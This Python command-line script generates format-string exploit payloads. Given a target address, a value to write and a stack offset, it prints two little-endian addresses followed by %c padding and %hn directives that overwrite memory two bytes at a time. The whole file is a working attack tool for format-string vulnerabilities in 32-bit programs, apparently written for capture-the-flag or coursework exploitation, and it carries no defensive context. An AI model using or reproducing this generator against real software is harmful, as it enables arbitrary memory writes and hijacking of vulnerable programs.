#!/usr/bin/python

import sys

# ********************************************* #
#                                               #
# This function take as input a string and      #
# convert it into an exadecimal value           #
#                                               #
# ********************************************* #
def stringToHex(stringValue):
    try:
        stringValue = int(stringValue, 16) # string -> int
        exadecimalValue = hex(stringValue)  # int -> hex
        return exadecimalValue[2:]
    except ValueError:
        sys.exit("\n ERROR: An input parameter is not a valid hexadecimal! \n")


# Take as input an hexadecimal value and transfor it into a little endian format
#
#
def littleEndian(hexValue):
    littleEndianValue = ''
    try:
        if(len(hexValue)==7):
            hexValue = '0'+str(hexValue)
        for i in range(7,-1,-2):
            littleEndianValue = littleEndianValue+'\\x'+str(hexValue[i-1])+str(hexValue[i])
        return littleEndianValue
    except:
        sys.exit("\n ERROR: An input parameter is not a valid hexadecimal! \n")







def computeFormatString(targetAddress, toWriteAddress, displacement):
    if((len(targetAddress) != 8) or (len(toWriteAddress) != 8)):
        print("\n ERROR: You must write 4byte addresses!\n")
        print(" Example: bfff6c4d \n")
        return False

    targetAddress = stringToHex(targetAddress)
    #print(targetAddress)
    targetAddressPlusTwo = hex(int(targetAddress,16)+2)[2:]
    #print(targetAddressPlusTwo)
    #print(littleEndian(targetAddress))
    #print(littleEndian(targetAddressPlusTwo))
    toWriteAddress = stringToHex(toWriteAddress)
    #print(toWriteAddress)

    if(int(toWriteAddress[:4], 16) > int(toWriteAddress[4:], 16)):
        lowerValue = int(toWriteAddress[4:], 16) - 8
        higherValue = int(toWriteAddress[:4], 16) - int(toWriteAddress[4:], 16)
        print('\n The format string is: \n')
        print('\t'+littleEndian(targetAddress)+littleEndian(targetAddressPlusTwo)+'%'+str(lowerValue)+'c%'+str(displacement)+'$hn%'+str(higherValue)+'c%'+str(int(displacement)+1)+'$hn')
        print('\n')
    else:
        lowerValue = int(toWriteAddress[:4], 16) - 8
        higherValue = int(toWriteAddress[4:], 16) - int(toWriteAddress[:4], 16)
        print('\n The format string is: \n')
        print(littleEndian(targetAddressPlusTwo)+littleEndian(targetAddress)+'%'+str(lowerValue)+'c%'+str(displacement)+'$hn%'+str(higherValue)+'c%'+str(int(displacement)+1)+'$hn')
        print('\n')






def main():
    numberOfArguments = len(sys.argv)
    if (numberOfArguments != 4):
        print("\n ERROR: You must write the right number of parameters! \n")
        print(" You must write the Target address, the toWrite Address and finally the displacement on the stack")
        print("\n Example: python formatString.py bfff6c4d 4faa3da2 3 \n")
    else:
        targetAddress = sys.argv[1]
        toWriteAddress = sys.argv[2]
        displacement = sys.argv[3]
        try:
            if int(displacement) < 0:
                print("\n ERROR: The displacement on the stack must be a positive value! \n")
            else:
                computeFormatString(targetAddress, toWriteAddress, displacement)
        except Exception :
            print("\n ERROR: The displacement on the stack must be a numeric value! \n")
            print(" You must write the Target address, the toWrite Address and finally the displacement on the stack")
            print("\n Example: python formatString.py bfff6c4d 4faa3da2 3 \n")
            #print(Exception)



if __name__ == "__main__":
    main()
#print 'Number of arguments:', , 'arguments.'
#print 'Argument List:', str(sys.argv)
